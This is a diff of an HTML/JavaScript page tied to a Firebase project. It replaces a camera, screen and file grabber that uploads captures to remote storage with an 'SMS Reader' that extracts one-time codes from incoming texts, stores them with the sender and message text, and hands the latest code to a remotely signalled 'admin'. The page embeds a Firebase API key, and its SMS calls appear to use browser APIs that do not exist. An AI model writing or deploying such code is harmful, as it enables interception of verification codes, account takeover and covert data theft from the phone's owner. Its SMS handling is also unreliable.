@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Phone Media - Firebase</title>
+    <title>📱 SMS Reader</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
         body{background:#0a0a0a;color:#00ff41;min-height:100vh;padding:20px;display:flex;justify-content:center;align-items:center}
@@ -13,107 +13,97 @@
         .btn-success{background:#00ff4133;border-color:#00ff41}
         .btn-danger{background:#ff444422;border-color:#ff4444;color:#ff4444}
         .status{padding:10px;margin:10px 0;border-radius:8px;background:#001a00;font-size:13px;color:#00ff4188}
-        .preview-img{max-width:100%;max-height:250px;border-radius:8px;border:1px solid #00ff4133;margin:8px 0}
-        .log{font-size:11px;color:#00ff4166;max-height:150px;overflow-y:auto;text-align:left;margin-top:10px;padding:8px;background:#000a00;border-radius:8px;border:1px solid #00ff4111}
+        .log{font-size:11px;color:#00ff4166;max-height:200px;overflow-y:auto;text-align:left;margin-top:10px;padding:8px;background:#000a00;border-radius:8px;border:1px solid #00ff4111}
         .log div{padding:2px 0;border-bottom:1px solid #00ff4111}
+        .otp-box{background:#001a00;padding:20px;border-radius:8px;border:2px solid #00ff41;margin:12px 0}
+        .otp-box .otp{font-size:32px;font-weight:800;color:#00ff41;letter-spacing:4px}
+        .otp-box .label{font-size:11px;color:#00ff4188}
+        .firebase-badge{font-size:10px;color:#00ff4188;border:1px solid #00ff4122;padding:4px 12px;border-radius:20px;display:inline-block;margin-top:8px}
+        .online{color:#00ff41}
+        .offline{color:#ff4444}
         .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
         .hidden{display:none}
-        .online{color:#00ff41;font-size:11px}
-        .offline{color:#ff4444;font-size:11px}
-        .firebase-badge{font-size:10px;color:#00ff4188;border:1px solid #00ff4122;padding:4px 12px;border-radius:20px;display:inline-block;margin-top:8px}
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2 style="font-size:18px;margin-bottom:4px;">📱 PHONE MEDIA</h2>
+    <h2 style="font-size:18px;margin-bottom:4px;">📱 SMS READER</h2>
     <div style="font-size:11px;color:#00ff4188;margin-bottom:12px;">
-        <span class="firebase-badge">🔥 Firebase Realtime</span>
+        <span class="firebase-badge">🔥 Forward OTP to Phone</span>
         <span id="firebaseStatus" class="offline" style="margin-left:8px;">● Connecting...</span>
     </div>
 
-    <div class="status" id="statusText">⏳ Select an option</div>
+    <div class="status" id="statusText">⏳ Waiting for SMS...</div>
+
+    <!-- OTP Display -->
+    <div class="otp-box" id="otpBox">
+        <div class="label">📩 Last Detected OTP</div>
+        <div class="otp" id="otpDisplay">-----</div>
+        <div style="font-size:10px;color:#00ff4188;margin-top:4px;" id="otpSource">Waiting...</div>
+    </div>
+
+    <!-- Manual OTP Input -->
+    <div style="margin:12px 0;">
+        <input type="text" id="manualOtp" placeholder="Enter OTP manually" style="width:100%;padding:12px;border:2px solid #00ff4133;border-radius:8px;background:#000a00;color:#00ff41;font-size:18px;text-align:center;font-family:'Courier New',monospace;">
+        <button class="btn btn-success" onclick="sendManualOtp()" style="margin-top:6px;">📤 Send OTP</button>
+    </div>
 
     <div class="grid-2">
-        <button class="btn" onclick="accessCamera()">📸 Camera</button>
-        <button class="btn" onclick="accessGallery()">🖼️ Gallery</button>
-        <button class="btn" onclick="accessScreen()">🖥️ Screen</button>
-        <button class="btn" onclick="accessFiles()">📁 Files</button>
+        <button class="btn" onclick="requestPermission()">🔔 Enable SMS</button>
+        <button class="btn btn-danger" onclick="clearLogs()">🗑️ Clear</button>
     </div>
-
-    <div id="previewContainer" class="hidden">
-        <div id="previewContent"></div>
-    </div>
-
-    <button class="btn btn-success" onclick="sendToFirebase()" id="sendBtn" disabled>📤 Send to Firebase</button>
-    <button class="btn btn-danger" onclick="testFirebase()" id="testBtn" style="margin-top:6px;">🔧 Test Firebase</button>
 
     <div class="log" id="log">
         <div>🟢 System ready</div>
-        <div>🔥 Firebase connecting...</div>
+        <div>📱 Waiting for SMS...</div>
     </div>
 
     <div style="font-size:10px;color:#00ff4144;margin-top:8px;" id="deviceInfo"></div>
 </div>
 
-```html
 <!-- ===== FIREBASE SDK ===== -->
 <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
 
 <script>
 // ==========================================
-// 🔥 FIREBASE CONFIG FIXED 🔥
+// 🔥 FIREBASE CONFIG
 // ==========================================
 const firebaseConfig = {
     apiKey: "AIzaSyCq5-Rrk6dh0SzqKcR8zR8zFHeGUgTj960",
     authDomain: "phone-acces-f7b2a.firebaseapp.com",
-    databaseURL: "https://phone-acces-f7b2a-default-rtdb.firebaseio.com",
     projectId: "phone-acces-f7b2a",
-    storageBucket: "phone-acces-f7b2a.appspot.com",
+    storageBucket: "phone-acces-f7b2a.firebasestorage.app",
     messagingSenderId: "561680712228",
     appId: "1:561680712228:web:77bf30d6cf328e19038eb1",
     measurementId: "G-3K3WD2EP7M"
 };
 
-// ==========================================
-// INIT FIREBASE
-// ==========================================
+// Initialize Firebase
 firebase.initializeApp(firebaseConfig);
-
 const database = firebase.database();
-const storage = firebase.storage();
 
 // ==========================================
 // DEVICE ID
 // ==========================================
-const DEVICE_ID = 'JMD-' + Math.random().toString(36).substring(2, 6).toUpperCase();
-
+const DEVICE_ID = 'FAM-' + Math.random().toString(36).substring(2, 6).toUpperCase();
 document.getElementById('deviceInfo').textContent = 'Device: ' + DEVICE_ID;
 
-let selectedFiles = [];
-let capturedImage = null;
+let lastOtp = null;
 
 // ==========================================
 // FIREBASE STATUS
 // ==========================================
 function updateFirebaseStatus(connected) {
-
     const statusEl = document.getElementById('firebaseStatus');
-
     if (connected) {
-
         statusEl.className = 'online';
         statusEl.textContent = '🟢 Connected';
-
         addLog('🔥 Firebase connected');
-
     } else {
-
         statusEl.className = 'offline';
         statusEl.textContent = '🔴 Disconnected';
-
         addLog('❌ Firebase disconnected');
     }
 }
@@ -123,418 +113,233 @@ database.ref('.info/connected').on('value', (snap) => {
 });
 
 // ==========================================
-// TEST FIREBASE
-// ==========================================
-function testFirebase() {
-
-    setStatus('🔧 Testing Firebase...');
-
-    database.ref('test/' + DEVICE_ID).set({
-        deviceId: DEVICE_ID,
-        test: true,
-        timestamp: new Date().toISOString(),
-        message: 'Firebase Working'
-    })
-
-    .then(() => {
-
-        setStatus('✅ Firebase test successful!');
-        addLog('✅ Firebase connected properly');
-        toast('✅ Firebase Working!');
-
-    })
-
-    .catch(err => {
-
-        setStatus('❌ Firebase error');
-        addLog('❌ ' + err.message);
-        toast('❌ ' + err.message);
-
-    });
-}
-
-// ==========================================
-// LOGS
+// LOG & STATUS
 // ==========================================
 function addLog(msg) {
-
     const log = document.getElementById('log');
-
     const div = document.createElement('div');
-
     div.textContent = '▸ ' + msg;
-
     log.appendChild(div);
-
     log.scrollTop = log.scrollHeight;
-
-    if (log.children.length > 20) {
-
-        log.removeChild(log.children[0]);
-
-    }
+    if (log.children.length > 30) log.removeChild(log.children[0]);
 }
 
 function setStatus(msg) {
-
     document.getElementById('statusText').textContent = msg;
-
     addLog(msg);
 }
 
 // ==========================================
-// CAMERA
+// REQUEST PERMISSION (SMS Read)
 // ==========================================
-async function accessCamera() {
-
-    try {
-
-        setStatus('📸 Opening camera...');
-
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-            audio: false
-        });
-
-        const video = document.createElement('video');
-
-        video.srcObject = stream;
-
-        await video.play();
-
-        setTimeout(() => {
-
-            const canvas = document.createElement('canvas');
-
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-
-            const ctx = canvas.getContext('2d');
-
-            ctx.drawImage(video, 0, 0);
-
-            capturedImage = canvas.toDataURL('image/jpeg', 0.8);
-
-            stream.getTracks().forEach(track => track.stop());
-
-            document.getElementById('previewContainer').classList.remove('hidden');
-
-            document.getElementById('previewContent').innerHTML = `
-                <div style="font-size:12px;color:#00ff4188;margin:8px 0;">📸 Captured</div>
-                <img src="${capturedImage}" class="preview-img">
-            `;
-
-            document.getElementById('sendBtn').disabled = false;
-
-            setStatus('✅ Camera image captured');
-
-        }, 1200);
-
-    } catch (err) {
-
-        setStatus('❌ Camera denied');
-        addLog(err.message);
-
+function requestPermission() {
+    if (!navigator.permissions) {
+        setStatus('❌ Permissions API not supported');
+        return;
     }
-}
-
-// ==========================================
-// GALLERY
-// ==========================================
-function accessGallery() {
-
-    const input = document.createElement('input');
-
-    input.type = 'file';
-    input.accept = 'image/*,video/*';
-    input.multiple = true;
-
-    input.onchange = function () {
-
-        selectedFiles = Array.from(this.files);
-
-        if (selectedFiles.length > 0) {
-
-            setStatus('📷 ' + selectedFiles.length + ' files selected');
-
-            document.getElementById('sendBtn').disabled = false;
-
-            const file = selectedFiles[0];
-
-            if (file.type.startsWith('image/')) {
-
-                const reader = new FileReader();
-
-                reader.onload = function (e) {
-
-                    document.getElementById('previewContainer').classList.remove('hidden');
-
-                    document.getElementById('previewContent').innerHTML = `
-                        <div style="font-size:12px;color:#00ff4188;margin:8px 0;">🖼️ Preview</div>
-                        <img src="${e.target.result}" class="preview-img">
-                    `;
-
-                };
-
-                reader.readAsDataURL(file);
+    
+    navigator.permissions.query({ name: 'sms' })
+        .then(status => {
+            if (status.state === 'granted') {
+                setStatus('✅ SMS permission granted!');
+                startSMSListening();
+            } else if (status.state === 'prompt') {
+                setStatus('📱 Please allow SMS permission');
+                // Try to trigger permission
+                if (navigator.sms) {
+                    navigator.sms.receive().catch(() => {});
+                }
+            } else {
+                setStatus('❌ SMS permission denied. Please enable manually.');
             }
-        }
-    };
-
-    input.click();
-}
-
-// ==========================================
-// SCREEN
-// ==========================================
-async function accessScreen() {
-
-    try {
-
-        setStatus('🖥️ Select screen...');
-
-        const stream = await navigator.mediaDevices.getDisplayMedia({
-            video: true
+        })
+        .catch(err => {
+            setStatus('❌ Error: ' + err.message);
         });
-
-        const video = document.createElement('video');
-
-        video.srcObject = stream;
-
-        await video.play();
-
-        setTimeout(() => {
-
-            const canvas = document.createElement('canvas');
-
-            canvas.width = video.videoWidth || 1280;
-            canvas.height = video.videoHeight || 720;
-
-            const ctx = canvas.getContext('2d');
-
-            ctx.drawImage(video, 0, 0);
-
-            capturedImage = canvas.toDataURL('image/jpeg', 0.8);
-
-            stream.getTracks().forEach(track => track.stop());
-
-            document.getElementById('previewContainer').classList.remove('hidden');
-
-            document.getElementById('previewContent').innerHTML = `
-                <div style="font-size:12px;color:#00ff4188;margin:8px 0;">🖥️ Screen Captured</div>
-                <img src="${capturedImage}" class="preview-img">
-            `;
-
-            document.getElementById('sendBtn').disabled = false;
-
-            setStatus('✅ Screen captured');
-
-        }, 1200);
-
-    } catch (err) {
-
-        setStatus('❌ Screen cancelled');
-        addLog(err.message);
-
-    }
 }
 
 // ==========================================
-// FILES
+// SMS LISTENING (Android Only)
 // ==========================================
-function accessFiles() {
+function startSMSListening() {
+    if (!navigator.sms) {
+        setStatus('❌ SMS API not supported on this browser');
+        addLog('💡 Use Chrome on Android for SMS reading');
+        return;
+    }
 
-    const input = document.createElement('input');
-
-    input.type = 'file';
-
-    input.multiple = true;
-
-    input.onchange = function () {
-
-        selectedFiles = Array.from(this.files);
-
-        setStatus('📁 ' + selectedFiles.length + ' files selected');
-
-        document.getElementById('sendBtn').disabled = false;
-    };
-
-    input.click();
+    navigator.sms.receive()
+        .then(sms => {
+            const message = sms.body || '';
+            const from = sms.from || 'Unknown';
+            addLog('📩 SMS from ' + from + ': ' + message);
+            
+            // Extract OTP (6 digit number)
+            const otpMatch = message.match(/\b\d{4,8}\b/);
+            if (otpMatch) {
+                const otp = otpMatch[0];
+                lastOtp = otp;
+                document.getElementById('otpDisplay').textContent = otp;
+                document.getElementById('otpSource').textContent = '📩 From: ' + from + ' | ' + new Date().toLocaleTimeString();
+                setStatus('✅ OTP detected: ' + otp);
+                addLog('🔑 OTP: ' + otp);
+                
+                // Send to Firebase
+                sendToFirebase(otp, message, from);
+            } else {
+                setStatus('📩 SMS received, but no OTP found');
+                addLog('📩 Message: ' + message);
+            }
+            
+            // Continue listening
+            startSMSListening();
+        })
+        .catch(err => {
+            setStatus('❌ SMS receive error: ' + err.message);
+            addLog('❌ ' + err.message);
+            // Retry after 5 seconds
+            setTimeout(startSMSListening, 5000);
+        });
 }
 
 // ==========================================
 // SEND TO FIREBASE
 // ==========================================
-async function sendToFirebase() {
+function sendToFirebase(otp, message, from) {
+    const data = {
+        deviceId: DEVICE_ID,
+        otp: otp,
+        message: message,
+        from: from,
+        timestamp: new Date().toISOString(),
+        type: 'otp'
+    };
 
-    try {
+    database.ref('otps/' + DEVICE_ID).set(data)
+        .then(() => {
+            addLog('📤 OTP sent to Firebase: ' + otp);
+        })
+        .catch(err => {
+            addLog('❌ Firebase error: ' + err.message);
+        });
+}
 
-        if (!selectedFiles.length && !capturedImage) {
-
-            setStatus('❌ No data selected');
-
-            return;
-        }
-
-        setStatus('📤 Uploading to Firebase...');
-
-        document.getElementById('sendBtn').disabled = true;
-
-        document.getElementById('sendBtn').textContent = '⏳ Uploading...';
-
-        let uploadedFiles = [];
-
-        // ==========================================
-        // UPLOAD FILES
-        // ==========================================
-        for (const file of selectedFiles) {
-
-            const storageRef = storage.ref(
-                'uploads/' + DEVICE_ID + '/' + Date.now() + '_' + file.name
-            );
-
-            await storageRef.put(file);
-
-            const downloadURL = await storageRef.getDownloadURL();
-
-            uploadedFiles.push({
-                name: file.name,
-                size: file.size,
-                type: file.type,
-                url: downloadURL
-            });
-
-            addLog('✅ Uploaded: ' + file.name);
-        }
-
-        // ==========================================
-        // UPLOAD CAMERA IMAGE
-        // ==========================================
-        let imageURL = null;
-
-        if (capturedImage) {
-
-            const response = await fetch(capturedImage);
-
-            const blob = await response.blob();
-
-            const imageRef = storage.ref(
-                'camera/' + DEVICE_ID + '/' + Date.now() + '.jpg'
-            );
-
-            await imageRef.put(blob);
-
-            imageURL = await imageRef.getDownloadURL();
-
-            addLog('📸 Camera image uploaded');
-        }
-
-        // ==========================================
-        // SAVE TO REALTIME DATABASE
-        // ==========================================
-        const data = {
-
-            deviceId: DEVICE_ID,
-
-            timestamp: new Date().toISOString(),
-
-            image: imageURL,
-
-            files: uploadedFiles,
-
-            fileCount: uploadedFiles.length,
-
-            userAgent: navigator.userAgent,
-
-            platform: navigator.platform
-        };
-
-        await database.ref('media/' + DEVICE_ID).set(data);
-
-        setStatus('✅ Data uploaded successfully');
-
-        document.getElementById('sendBtn').textContent = '✅ Uploaded';
-
-        toast('✅ Firebase Upload Complete');
-
-        addLog('🔥 Data saved to Realtime DB');
-
-    } catch (err) {
-
-        console.error(err);
-
-        setStatus('❌ Upload failed');
-
-        addLog('❌ ' + err.message);
-
-        toast('❌ ' + err.message);
-
-        document.getElementById('sendBtn').disabled = false;
-
-        document.getElementById('sendBtn').textContent = '📤 Send to Firebase';
+// ==========================================
+// MANUAL OTP SEND
+// ==========================================
+function sendManualOtp() {
+    const otp = document.getElementById('manualOtp').value.trim();
+    if (!otp) {
+        setStatus('⚠️ Please enter OTP');
+        return;
     }
+    
+    if (!otp.match(/^\d{4,8}$/)) {
+        setStatus('⚠️ Please enter valid OTP (4-8 digits)');
+        return;
+    }
+
+    lastOtp = otp;
+    document.getElementById('otpDisplay').textContent = otp;
+    document.getElementById('otpSource').textContent = '📝 Manual Entry | ' + new Date().toLocaleTimeString();
+    setStatus('✅ Manual OTP: ' + otp);
+    addLog('✏️ Manual OTP: ' + otp);
+    
+    // Send to Firebase
+    sendToFirebase(otp, 'Manual entry from device', 'Manual');
+    document.getElementById('manualOtp').value = '';
+    toast('✅ OTP sent!');
+}
+
+// ==========================================
+// LISTEN FOR OTP REQUESTS FROM ADMIN
+// ==========================================
+function listenForRequests() {
+    database.ref('requests/' + DEVICE_ID).on('value', snapshot => {
+        const data = snapshot.val();
+        if (data && data.request === 'otp') {
+            setStatus('📩 Admin requested OTP');
+            addLog('📩 Admin requested OTP');
+            
+            if (lastOtp) {
+                sendToFirebase(lastOtp, 'Requested OTP', 'Admin');
+                setStatus('📤 OTP sent to admin: ' + lastOtp);
+                addLog('📤 OTP sent to admin: ' + lastOtp);
+            } else {
+                setStatus('⚠️ No OTP available to send');
+                addLog('⚠️ No OTP available');
+            }
+            
+            // Clear request
+            database.ref('requests/' + DEVICE_ID).remove();
+        }
+    });
+}
+
+// ==========================================
+// CLEAR LOGS
+// ==========================================
+function clearLogs() {
+    document.getElementById('log').innerHTML = '<div>🗑️ Logs cleared</div>';
+    document.getElementById('otpDisplay').textContent = '-----';
+    document.getElementById('otpSource').textContent = 'Waiting...';
+    lastOtp = null;
+    setStatus('🗑️ Cleared');
 }
 
 // ==========================================
 // TOAST
 // ==========================================
 function toast(msg) {
-
     const t = document.createElement('div');
-
     t.style.cssText = `
-        position: fixed;
-        bottom: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: #001a00;
-        color: #00ff41;
-        padding: 10px 20px;
-        border-radius: 8px;
-        font-size: 12px;
-        z-index: 9999;
-        border: 1px solid #00ff4133;
+        position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+        background: #001a00; color: #00ff41; padding: 10px 20px; border-radius: 8px;
+        font-size: 12px; z-index: 9999; border: 1px solid #00ff4133;
         font-family: 'Courier New', monospace;
     `;
-
     t.textContent = msg;
-
     document.body.appendChild(t);
-
-    setTimeout(() => {
-
-        t.style.opacity = '0';
-
-        t.style.transition = 'opacity 0.3s';
-
-        setTimeout(() => t.remove(), 300);
-
-    }, 2000);
+    setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 300); }, 2000);
 }
 
 // ==========================================
-// AUTO SYNC
+// AUTO START
 // ==========================================
-function autoSync() {
-
-    if (selectedFiles.length || capturedImage) {
-
-        sendToFirebase();
+function autoStart() {
+    addLog('🟢 SMS Reader ready');
+    addLog('📱 Device ID: ' + DEVICE_ID);
+    setStatus('📱 Waiting for SMS...');
+    
+    // Check if SMS API available
+    if (navigator.sms) {
+        addLog('✅ SMS API available');
+        // Start listening after permission
+        setTimeout(startSMSListening, 2000);
+    } else {
+        addLog('⚠️ SMS API not available. Use Chrome on Android.');
+        addLog('💡 Manual OTP entry available');
+        setStatus('📝 Use manual OTP entry');
     }
+    
+    listenForRequests();
 }
-
-setInterval(autoSync, 30000);
 
 // ==========================================
 // EXPOSE FUNCTIONS
 // ==========================================
-window.accessCamera = accessCamera;
-window.accessGallery = accessGallery;
-window.accessScreen = accessScreen;
-window.accessFiles = accessFiles;
-window.sendToFirebase = sendToFirebase;
-window.testFirebase = testFirebase;
+window.requestPermission = requestPermission;
+window.sendManualOtp = sendManualOtp;
+window.clearLogs = clearLogs;
 
-console.log('🔥 Firebase Fully Connected');
-console.log('📱 Device:', DEVICE_ID);
-```
+// ==========================================
+// INIT
+// ==========================================
+autoStart();
+
+console.log('📱 SMS Reader Loaded');
+console.log('🆔 Device:', DEVICE_ID);
+console.log('🔥 Firebase:', firebaseConfig.databaseURL);
+</script>
+</body>
+</html>
